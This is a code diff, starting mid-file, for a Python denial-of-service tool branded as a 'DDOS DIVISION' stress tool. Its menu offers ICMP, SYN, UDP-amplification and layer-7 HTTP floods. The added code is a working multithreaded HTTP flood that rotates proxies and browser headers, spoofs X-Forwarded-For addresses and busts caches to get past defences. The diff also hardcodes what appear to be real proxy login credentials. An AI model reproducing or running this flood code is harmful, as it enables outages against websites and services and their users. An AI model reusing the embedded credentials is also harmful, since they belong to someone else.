+                            proxy_configs.append({'http': proxy_url, 'https': proxy_url})
+                            print(f"✅ Working proxy found ({len(proxy_configs)})")
+                            if len(proxy_configs) >= 10:  # Get at least 10 working proxies
+                                break
+                    except:
+                        continue
+                
+                if proxy_configs:
+                    print(f"\n✅ Found {len(proxy_configs)} working proxies")
+                    proxy_configs = proxy_configs * 5  # Multiply working proxies
+                else:
+                    print("\n⚠️ No working proxies found, switching to direct connection")
+                    self.use_proxy = False
+            
+            # Enhanced request variations
+            methods = ['GET', 'POST', 'HEAD'] if initial_status != 405 else ['GET']
+            paths = ['/', '/index.html', '/api', '/test', '/status', '/health']
+            
+            # Enhanced User-Agent rotation
+            rotating_agents = [
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36',
+                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+            ]
+            
+            # Enhanced headers with better browser simulation
+            base_headers = []
+            for agent in rotating_agents:
+                headers = {
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                    'Accept-Language': 'en-US,en;q=0.9,es;q=0.8',
+                    'Accept-Encoding': 'gzip, deflate, br',
+                    'Connection': 'keep-alive',
+                    'User-Agent': agent,
+                    'Cache-Control': 'no-cache',
+                    'Pragma': 'no-cache',
+                    'Upgrade-Insecure-Requests': '1',
+                    'Sec-Fetch-Dest': 'document',
+                    'Sec-Fetch-Mode': 'navigate',
+                    'Sec-Fetch-Site': 'none',
+                    'Sec-Fetch-User': '?1'
+                }
+                base_headers.append(headers)
+            
+            # Enhanced payloads with more variety
+            payloads = [
+                b'data=test&type=status',
+                b'{"action":"status","id":"test"}',
+                b'status=check&time=' + str(int(time.time())).encode(),
+                b'ping=1&timestamp=' + str(int(time.time())).encode(),
+                urlencode({'test': 'data', 'time': str(int(time.time()))}).encode()
+            ]
+            
+            # Initialize counters
+            request_count = 0
+            pool_index = 0
+            proxy_index = 0
+            header_index = 0
+            
+            # Optimized thread pool
+            max_workers = 250 if self.use_proxy else 500  # Reduced for better stability
+            
+            def send_request():
+                nonlocal request_count, pool_index, proxy_index, header_index
+                
+                while self.running:
+                    try:
+                        # Rotate through pools
+                        pool = pools[pool_index]
+                        pool_index = (pool_index + 1) % len(pools)
+                        
+                        # Handle proxy rotation
+                        if proxy_configs:
+                            proxies = proxy_configs[proxy_index]
+                            proxy_index = (proxy_index + 1) % len(proxy_configs)
+                            pool.proxy = proxies
+                        
+                        # Rotate through methods and paths
+                        method = methods[request_count % len(methods)]
+                        path = paths[request_count % len(paths)]
+                        
+                        # Enhanced URL with better cache busting
+                        timestamp = int(time.time() * 1000)
+                        random_param = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=4))
+                        url = f"{self.target.rstrip('/')}{path}?_={timestamp}&{random_param}={request_count}"
+                        
+                        # Rotate headers with enhanced browser simulation
+                        headers = base_headers[header_index].copy()
+                        header_index = (header_index + 1) % len(base_headers)
+                        
+                        # Add dynamic headers
+                        headers['X-Request-ID'] = f"{timestamp}-{random.randint(1000,9999)}"
+                        headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+                        
+                        # Prepare request data
+                        request_data = None
+                        if method == 'POST':
+                            request_data = payloads[request_count % len(payloads)]
+                            headers['Content-Type'] = 'application/x-www-form-urlencoded'
+                        
+                        # Enhanced request with better error handling
+                        start_time = time.time()
+                        try:
+                            response = pool.request(
+                                method=method,
+                                url=url,
+                                headers=headers,
+                                body=request_data,
+                                timeout=urllib3.Timeout(connect=2, read=4),
+                                retries=False,
+                                preload_content=False
+                            )
+                            
+                            status = response.status
+                            # Consider more status codes as success
+                            success = status < 500 and status != 429  # Accept anything except server errors and rate limits
+                            response.drain_conn()
+                            
+                            if success:
+                                with self.lock:
+                                    self.success_count += 1
+                            
+                        except urllib3.exceptions.TimeoutError:
+                            # Retry once on timeout with increased timeout
+                            try:
+                                response = pool.request(
+                                    method=method,
+                                    url=url,
+                                    headers=headers,
+                                    body=request_data,
+                                    timeout=urllib3.Timeout(connect=3, read=6),
+                                    retries=False,
+                                    preload_content=False
+                                )
+                                status = response.status
+                                success = status < 500 and status != 429
+                                response.drain_conn()
+                                
+                                if success:
+                                    with self.lock:
+                                        self.success_count += 1
+                            except:
+                                status = 0
+                                success = False
+                        except:
+                            status = 0
+                            success = False
+                        
+                        # Track results
+                        with self.lock:
+                            self.request_count += 1
+                            if len(self.results) < 1000:  # Keep last 1000 results
+                                self.results.append({
+                                    'success': success,
+                                    'status': status,
+                                    'timestamp': start_time,
+                                    'method': method,
+                                    'path': path
+                                })
+                        
+                        request_count += 1
+                        
+                        # Small delay between requests for stability
+                        time.sleep(0.01)
+                        
+                    except Exception as e:
+                        continue
+            
+            print("\n⚡ Starting attack threads...")
+            
+            # Enhanced batch processing
+            batch_number = 0
+            active_threads = 0
+            max_active_threads = max_workers
+            
+            with ThreadPoolExecutor(max_workers=max_active_threads) as executor:
+                futures = []
+                
+                try:
+                    while self.running:
+                        batch_number += 1
+                        batch_size = 25  # Smaller batch size for better control
+                        
+                        # Clean up completed futures
+                        futures = [f for f in futures if not f.done()]
+                        active_threads = len(futures)
+                        
+                        # Add new batch if we have room
+                        if active_threads < max_active_threads:
+                            new_threads = min(batch_size, max_active_threads - active_threads)
+                            print(f"\r💥 Starting batch #{batch_number} (+{new_threads} threads) | Active: {active_threads + new_threads}", end='')
+                            
+                            for _ in range(new_threads):
+                                if not self.running:
+                                    break
+                                futures.append(executor.submit(send_request))
+                            
+                            # Adaptive delay between batches
+                            if self.success_count > 0:
+                                time.sleep(0.05)  # Shorter delay if we're having success
+                            else:
+                                time.sleep(0.1)  # Longer delay if no success
+                        
+                        # Print detailed status
+                        if self.request_count > 0:
+                            success_rate = (self.success_count / self.request_count) * 100
+                            print(f"\r💥 Batch #{batch_number} | Active Threads: {active_threads} | "
+                                  f"Success Rate: {success_rate:.1f}% ({self.success_count}/{self.request_count})", end='')
+                
+                except KeyboardInterrupt:
+                    print("\n\n🛑 Attack stopped by user")
+                    self.running = False
+                
+                # Graceful shutdown
+                print("\n⏳ Stopping threads...")
+                for future in futures:
+                    future.cancel()
+                executor.shutdown(wait=False, cancel_futures=True)
+            
+        except KeyboardInterrupt:
+            print("\n\n🛑 Attack stopped by user")
+        finally:
+            self.running = False
+            for pool in pools:
+                try:
+                    pool.clear()
+                except:
+                    pass
+            monitor_thread.join(timeout=1)
+            
+            # Print final statistics
+            if self.request_count > 0:
+                final_success_rate = (self.success_count / self.request_count) * 100
+                print(f"\n\n📊 Final Statistics:")
+                print(f"Total Requests: {self.request_count}")
+                print(f"Successful: {self.success_count}")
+                print(f"Success Rate: {final_success_rate:.1f}%")
+                
+                if self.results:
+                    status_counts = {}
+                    for result in self.results:
+                        status = result.get('status', 0)
+                        status_counts[status] = status_counts.get(status, 0) + 1
+                    
+                    print("\nStatus Code Distribution:")
+                    for status, count in sorted(status_counts.items()):
+                        print(f"Status {status}: {count} requests")
+            
+            print("\n⏳ Finalizing...")
+            time.sleep(1)
+
+    def execute_direct_attack(self):
+        """Execute direct attack with maximum effectiveness"""
+        self.execute_enhanced_attack()
+
 def signal_handler(sig, frame):
     """Handle Ctrl+C gracefully"""
     print("\n\n🛑 Stopping attack...")
     sys.exit(0)
 
-def print_banner():
-    """Print the tool banner"""
-    banner = """
-\033[91m
-    ██████╗ ████████╗██████╗ 
-    ██╔══██╗╚══██╔══╝██╔══██╗
-    ██████╔╝   ██║   ██████╔╝
-    ██╔══██╗   ██║   ██╔══██╗
-    ██████╔╝   ██║   ██║  ██║
-    ╚═════╝    ╚═╝   ╚═╝  ╚═╝ v2.0 ATTACK RESPONSIBLY
-\033[0m
-"""
-    print(banner)
-
-def print_menu():
-    """Print the menu"""
-    print("\n\033[96m[*] Options:\033[0m")
-    print("\033[97m1. ICMP")
-    print("2. TCP")
-    print("3. UDP") 
-    print("4. HTTP\033[0m")
-
-def main():
-    signal.signal(signal.SIGINT, signal_handler)
+def print_blinking_banner():
+    """Print the banner with enhanced hacker theme"""
+    import sys
+    import time
     
-    print_banner()
-    print_menu()
+    # ANSI color codes for hacker theme
+    colors = [
+        '\033[38;5;46m',   # Bright Green
+        '\033[38;5;196m',  # Bright Red
+        '\033[38;5;51m',   # Cyan
+        '\033[38;5;201m',  # Magenta
+        '\033[38;5;226m'   # Yellow
+    ]
+    
+    banner = """
+\033[38;5;46m
+    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+    █░░░░░░░░▀█▄░░░░░░░░░░░░░░░░░░░▄█▀░░░░░░░░█░░░░░░░░░░░░░░░░░▄█▀░░░░░░░░█
+    █░░▄▀▀▀▀▀▀░░░▀█▄░░░░░░░░░░░░▄█▀░░░▀▀▀▀▀▄░█░░▄▀▀▀▀▀▀░░░░▄█▀░░░▀▀▀▀▀▄░░█
+    █░░█▄▄░░░░░░░░░░▀█▄░░░░░░▄█▀░░░░░░░░▄▄█░█░░█▄▄░░░░░░▄█▀░░░░░░░░▄▄█░░░█
+    █░░░░░▀█▄░░░░░░░░░░▀█▄▄█▀░░░░░░░░▄█▀░░░░█░░░░░▀█▄▄█▀░░░░░░░░▄█▀░░░░░░█
+    █░░░░░░░░▀█▄░░░░░░░░░░░░░░░░░░▄█▀░░░░░░░░█░░░░░░░░░░░░░░░░▄█▀░░░░░░░░░█
+    ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
+
+             ██╗      █████╗ ██╗   ██╗███████╗██████╗ ███████╗
+             ██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗╚════██║
+             ██║     ███████║ ╚████╔╝ █████╗  ██████╔╝    ██╔╝
+             ██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗   ██╔╝ 
+             ███████╗██║  ██║   ██║   ███████╗██║  ██║   ██║  
+             ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝   ╚═╝  
+                                                      
+                      [ADVANCED NETWORK STRESS  TOOL]
+                    [CREATED BY: (BTR) DDOS DIVISION]
+                        [USE AT YOUR OWN RISK]
+\033[0m"""
+    
+    matrix_rain = [
+        "1010101010101",
+        "0101010101010",
+        "1100110011001",
+        "0011001100110"
+    ]
     
     try:
-        layer_choice = input("\n\033[96m>>> \033[0m").strip() or "4"
+        # Matrix rain effect
+        for _ in range(3):
+            for rain in matrix_rain:
+                sys.stdout.write('\033[2J\033[H')  # Clear screen
+                print('\033[38;5;46m' + rain + '\033[0m')  # Green matrix rain
+                time.sleep(0.1)
         
-        layer_map = {
-            "1": "icmp",
-            "2": "tcp", 
-            "3": "udp",
-            "4": "http"
-        }
+        # Final banner display with glitch effect
+        sys.stdout.write('\033[2J\033[H')  # Clear screen
+        for color in colors:
+            sys.stdout.write('\033[2J\033[H')
+            print(color + banner + '\033[0m')
+            time.sleep(0.1)
         
-        target_type = layer_map.get(layer_choice, "http")
+        # Final static display in green
+        sys.stdout.write('\033[2J\033[H')
+        print('\033[38;5;46m' + banner + '\033[0m')
         
-        if target_type == "icmp":
-            target = input("\n\033[96mTarget: \033[0m").strip()
-        elif target_type in ["tcp", "udp"]:
-            target = input("\n\033[96mTarget:Port: \033[0m").strip()
-        else:
-            target = input("\n\033[96mURL: \033[0m").strip()
-        
-        use_proxy = False
-        proxy_config = None
-        
-        if target_type == "http":
-            use_proxy = input("\n\033[96mProxy? (y/n): \033[0m").strip().lower() == 'y'
-            
-            if use_proxy:
-                use_default = input("\033[96mDefault proxy? (y/n): \033[0m").strip().lower() != 'n'
-                
-                if use_default:
-                    proxy_config = {
-                        'host': 'aus.360s5.com',
-                        'port': '3600',
-                        'username': '82942143-zone-custom-sessid-f4YxGjAW',
-                        'password': 'dp7BTFPX'
-                    }
-                else:
-                    proxy_config = {
-                        'host': input("\033[96mHost: \033[0m").strip(),
-                        'port': input("\033[96mPort: \033[0m").strip(),
-                        'username': input("\033[96mUser: \033[0m").strip(),
-                        'password': input("\033[96mPass: \033[0m").strip()
-                    }
-        
-        tester = NetworkLayerTester(target, target_type, use_proxy=use_proxy, proxy_config=proxy_config)
-        
-        print("\n\033[96m[*] Mode:\033[0m")
-        print("\033[97m1. Rate-Limited")
-        print("2. Multi-Method Attack")
-        print("3. Burst\033[0m")
-        
-        mode = input("\n\033[96m>>> \033[0m").strip() or "1"
-        
-        print("\n💣 Press Ctrl+C to stop the attack")
+    except KeyboardInterrupt:
+        sys.stdout.write('\033[2J\033[H')
+        print('\033[38;5;46m' + banner + '\033[0m')
+
+def print_banner():
+    """Print the tool banner"""
+    print_blinking_banner()
+
+def print_menu():
+    """Print the enhanced hacker-themed menu"""
+    print("\n\033[38;5;46m╔════════════════════════════════════════╗")
+    print("║             \033[38;5;196mATTACK MODES\033[38;5;46m             ║")
+    print("╠════════════════════════════════════════╣")
+    print("║ [\033[38;5;226m1\033[38;5;46m] ICMP    [\033[38;5;226mPING OF DEATH\033[38;5;46m]        ║")
+    print("║ [\033[38;5;226m2\033[38;5;46m] TCP     [\033[38;5;226mSYN FLOOD\033[38;5;46m]            ║")
+    print("║ [\033[38;5;226m3\033[38;5;46m] UDP     [\033[38;5;226mAMPLIFICATION\033[38;5;46m]        ║")
+    print("║ [\033[38;5;226m4\033[38;5;46m] HTTP    [\033[5m\033[38;5;196mLAY-DOWN 7\033[0m\033[38;5;46m]            ║")
+    print("╚════════════════════════════════════════╝\033[0m")
+
+def print_attack_banner(attack_type, target):
+    """Print cool attack initiation banner"""
+    print(f"""
+\033[38;5;46m╔══════════════════════════════════════════════════════════╗
+║                     ATTACK INITIATED                      ║
+╠══════════════════════════════════════════════════════════╣
+║ TARGET: \033[38;5;196m{target[:40]}\033[38;5;46m
+║ MODE:   \033[38;5;196m{attack_type}\033[38;5;46m
+║ STATUS: \033[38;5;226mINITIALIZING ATTACK VECTORS\033[38;5;46m
+╚══════════════════════════════════════════════════════════╝\033[0m
+""")
+
+def print_status(request_count, success_count, current_rps, elapsed_time):
+    """Print enhanced status with hacker theme"""
+    status_bar = f"""
+\033[38;5;46m╔═══════════════════════ ATTACK STATUS ═══════════════════════╗
+║ REQUESTS: \033[38;5;226m{request_count:,}\033[38;5;46m                                          
+║ SUCCESS:  \033[38;5;226m{success_count:,}\033[38;5;46m
+║ RPS:      \033[38;5;226m{current_rps:.1f}\033[38;5;46m
+║ TIME:     \033[38;5;226m{elapsed_time:.1f}s\033[38;5;46m
+╚════════════════════════════════════════════════════════════╝\033[0m"""
+    print(status_bar, end='\r')
+
+def print_final_stats(total_requests, successful, failed, duration, rps):
+    """Print enhanced final statistics"""
+    stats = f"""
+\033[38;5;46m╔═══════════════════════ FINAL REPORT ════════════════════════╗
+║                                                                ║
+║  TARGET STATUS:    \033[38;5;226m{"BREACHED" if successful > failed else "RESISTANT"}\033[38;5;46m
+║  TOTAL REQUESTS:   \033[38;5;226m{total_requests:,}\033[38;5;46m
+║  SUCCESSFUL HITS:  \033[38;5;226m{successful:,}\033[38;5;46m
+║  FAILED ATTEMPTS:  \033[38;5;226m{failed:,}\033[38;5;46m
+║  ATTACK DURATION:  \033[38;5;226m{duration:.2f}s\033[38;5;46m
+║  AVG REQUESTS/SEC: \033[38;5;226m{rps:.1f}\033[38;5;46m
+║                                                                ║
+╚════════════════════════════════════════════════════════════════╝\033[0m"""
+    print(stats)
+
+def main():
+    """Enhanced main function with hacker theme"""
+    signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
+    
+    try:
+        print_blinking_banner()
+        print_menu()
         
         try:
-            if mode == "1":
-                tester.rate_limited_executor()
-            elif mode == "2":
-                tester.multi_method_attack()
-            else:
-                tester.burst_mode()
-        except KeyboardInterrupt:
-            print("\n\n🛑 Attack stopped")
-            sys.exit(0)
+            layer_choice = input("\n\033[38;5;46m[\033[38;5;226m*\033[38;5;46m] Select attack mode: \033[38;5;226m").strip() or "4"
             
-    except KeyboardInterrupt:
-        print("\n\n🛑 Setup cancelled")
-        sys.exit(0)
+            layer_map = {
+                "1": "icmp",
+                "2": "tcp", 
+                "3": "udp",
+                "4": "http"
+            }
+            
+            target_type = layer_map.get(layer_choice, "http")
+            
+            if target_type == "icmp":
+                target = input("\n\033[38;5;46m[\033[38;5;226m*\033[38;5;46m] Enter target IP: \033[38;5;226m").strip()
+            elif target_type in ["tcp", "udp"]:
+                target = input("\n\033[38;5;46m[\033[38;5;226m*\033[38;5;46m] Enter target IP:PORT: \033[38;5;226m").strip()
+            else:
+                target = input("\n\033[38;5;46m[\033[38;5;226m*\033[38;5;46m] Enter target URL: \033[38;5;226m").strip()
+            
+            use_proxy = False
+            proxy_config = None
+            
+            if target_type == "http":
+                use_proxy = input("\n\033[38;5;46m[\033[38;5;226m*\033[38;5;46m] Use proxy? (y/n): \033[38;5;226m").strip().lower() == 'y'
+                
+                if use_proxy:
+                    use_default = input("\033[38;5;46m[\033[38;5;226m*\033[38;5;46m] Use default proxy? (y/n): \033[38;5;226m").strip().lower() != 'n'
+                    
+                    if use_default:
+                        proxy_config = {
+                            'host': 'aus.360s5.com',
+                            'port': '3600',
+                            'username': '82942143-zone-custom-sessid-f4YxGjAW',
+                            'password': 'dp7BTFPX'
+                        }
+                    else:
+                        print("\n\033[38;5;46m[\033[38;5;226m*\033[38;5;46m] Enter proxy details:")
+                        proxy_config = {
+                            'host': input("\033[38;5;46m├─[\033[38;5;226m+\033[38;5;46m] Host: \033[38;5;226m").strip(),
+                            'port': input("\033[38;5;46m├─[\033[38;5;226m+\033[38;5;46m] Port: \033[38;5;226m").strip(),
+                            'username': input("\033[38;5;46m├─[\033[38;5;226m+\033[38;5;46m] Username: \033[38;5;226m").strip(),
+                            'password': input("\033[38;5;46m└─[\033[38;5;226m+\033[38;5;46m] Password: \033[38;5;226m").strip()
+                        }
+            
+            print("\n\033[38;5;46m╔════════════════════════════════════════╗")
+            print("║             \033[38;5;196mATTACK POWER\033[38;5;46m             ║")
+            print("╠════════════════════════════════════════╣")
+            print("║ [\033[38;5;226m1\033[38;5;46m] SURGICAL    [\033[38;5;226mRATE LIMITED\033[38;5;46m]     ║")
+            print("║ [\033[38;5;226m2\033[38;5;46m] TACTICAL    [\033[38;5;226mMULTI-METHOD\033[38;5;46m]     ║")
+            print("║ [\033[38;5;226m3\033[38;5;46m] NUCLEAR     [\033[38;5;226mMAX POWER\033[38;5;46m]        ║")
+            print("╚════════════════════════════════════════╝\033[0m")
+            
+            mode = input("\n\033[38;5;46m[\033[38;5;226m*\033[38;5;46m] Select attack power: \033[38;5;226m").strip() or "1"
+            
+            print("\n\033[38;5;196m[!] DISCLAIMER: USE AT YOUR OWN RISK [!]\033[0m")
+            time.sleep(1)
+            
+            print("\n\033[38;5;46m[*] Initializing attack vectors...")
+            time.sleep(0.5)
+            print("[*] Calibrating payload delivery...")
+            time.sleep(0.5)
+            print("[*] Engaging target systems...\033[0m")
+            time.sleep(0.5)
+            
+            attack_type = {
+                "1": "SURGICAL STRIKE",
+                "2": "TACTICAL ASSAULT",
+                "3": "NUCLEAR OPTION"
+            }.get(mode, "UNKNOWN")
+            
+            print_attack_banner(attack_type, target)
+            
+            tester = NetworkLayerTester(target, target_type, use_proxy=use_proxy, proxy_config=proxy_config)
+            
+            try:
+                if mode == "1":
+                    tester.rate_limited_executor()
+                elif mode == "2":
+                    tester.multi_method_attack()
+                else:
+                    tester.burst_mode()
+            except KeyboardInterrupt:
+                print("\n\n\033[38;5;196m[!] ATTACK ABORTED BY OPERATOR [!]\033[0m")
+                sys.exit(0)
+            except Exception as e:
+                print(f"\n\n\033[38;5;196m[!] ATTACK ERROR: {str(e)} [!]\033[0m")
+                sys.exit(1)
+            
+        except KeyboardInterrupt:
+            print("\n\n\033[38;5;196m[!] OPERATION CANCELLED [!]\033[0m")
+            sys.exit(0)
+        except Exception as e:
+            print(f"\n\n\033[38;5;196m[!] FATAL ERROR: {str(e)} [!]\033[0m")
+            sys.exit(1)
+            
     except Exception as e:
-        print(f"\n\n❌ Error: {str(e)}")
+        print(f"\n\n\033[38;5;196m[!] SYSTEM ERROR: {str(e)} [!]\033[0m")
         sys.exit(1)
 
 if __name__ == "__main__":
